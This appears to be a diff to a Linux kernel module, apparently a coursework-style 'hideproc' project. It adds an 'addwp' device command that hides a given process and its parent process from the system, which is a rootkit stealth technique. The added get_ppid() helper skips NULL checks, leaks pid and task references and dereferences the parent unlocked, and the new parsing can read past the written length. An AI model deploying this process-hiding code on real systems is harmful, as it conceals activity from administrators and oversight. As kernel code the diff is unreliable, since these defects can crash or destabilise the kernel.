@@ -175,7 +175,17 @@ static ssize_t device_read(struct file *filep,
     return *offset;
 }
 
-enum OPERATION { ADD, DEL, UNKNOW };
+static pid_t get_ppid(pid_t pid)
+{
+    struct pid *pid_struct;
+    struct task_struct *task;
+
+    pid_struct = find_get_pid(pid);
+    task = get_pid_task(pid_struct, PIDTYPE_PID);
+    return task->parent->pid;
+}
+
+enum OPERATION { ADD, DEL, ADDWP, UNKNOW };
 
 static ssize_t device_write(struct file *filep,
                             const char *buffer,
@@ -183,10 +193,11 @@ static ssize_t device_write(struct file *filep,
                             loff_t *offset)
 {
     int ret, oper;
-    long pid;
+    long pid, ppid;
     char *message;
 
-    char add_message[] = "add", del_message[] = "del";
+    char add_message[] = "add", del_message[] = "del",
+         addwp_message[] = "addwp";
     if (len < sizeof(add_message) - 1 && len < sizeof(del_message) - 1)
         return -EAGAIN;
 
@@ -195,7 +206,9 @@ static ssize_t device_write(struct file *filep,
     copy_from_user(message, buffer, len);
 
     /* Parse the operation */
-    if (!memcmp(message, add_message, sizeof(add_message) - 1))
+    if (!memcmp(message, addwp_message, sizeof(addwp_message) - 1))
+        oper = ADDWP;
+    else if (!memcmp(message, add_message, sizeof(add_message) - 1))
         oper = ADD;
     else if (!memcmp(message, del_message, sizeof(del_message) - 1))
         oper = DEL;
@@ -211,12 +224,32 @@ static ssize_t device_write(struct file *filep,
             kfree(message);
             return ret;
         }
+    } else if (oper == ADDWP) {
+        ret = kstrtol(message + sizeof(addwp_message), 10, &pid);
+        if (ret) {
+            kfree(message);
+            return ret;
+        }
     }
 
     /* Do the given operation */
     switch (oper) {
     case ADD:
         ret = hide_process(pid);
+        if (ret != SUCCESS) {
+            kfree(message);
+            return ret;
+        }
+	break;
+    case ADDWP:
+        ret = hide_process(pid);
+        if (ret != SUCCESS) {
+            kfree(message);
+            return ret;
+        }
+        /* Add its parent pid as well */
+        ppid = get_ppid(pid);
+        ret = hide_process(ppid);
         if (ret != SUCCESS) {
             kfree(message);
             return ret;
